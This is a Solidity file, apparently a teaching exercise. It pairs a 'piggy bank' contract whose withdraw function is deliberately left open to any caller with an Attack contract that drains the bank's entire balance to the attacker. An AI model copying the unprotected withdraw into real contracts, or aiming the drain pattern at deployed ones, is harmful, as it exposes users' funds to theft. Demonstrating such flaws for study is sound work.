
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract VulnerablePiggyBank {
    address public owner;
    constructor() { owner = msg.sender; }
    function deposit() public payable {}
    
    // this is the vulnerability because the withdraw function in public without any restrictions on who can call the withdraw function 
    function withdraw() public { payable(msg.sender).transfer(address(this).balance); }
}


contract Attack {
    address payable private attacker;
    VulnerablePiggyBank public target;

    constructor(address _target) {
        attacker = payable(msg.sender);
        target = VulnerablePiggyBank(_target);
    }

    receive() external payable {}

    //Not neccessary but useful to simulate normal usage
    function fundTarged() public payable {
        require(msg.value > 0, "Need to send some funds" );
        target.deposit{value: msg.value}();
    }
    function attack() public {
        target.withdraw();
    }

    function withdraw() public {
        require(msg.sender == attacker, "Only attacker who deployed the contract can withdraw");
        payable(attacker).transfer(address(this).balance);
    }
}


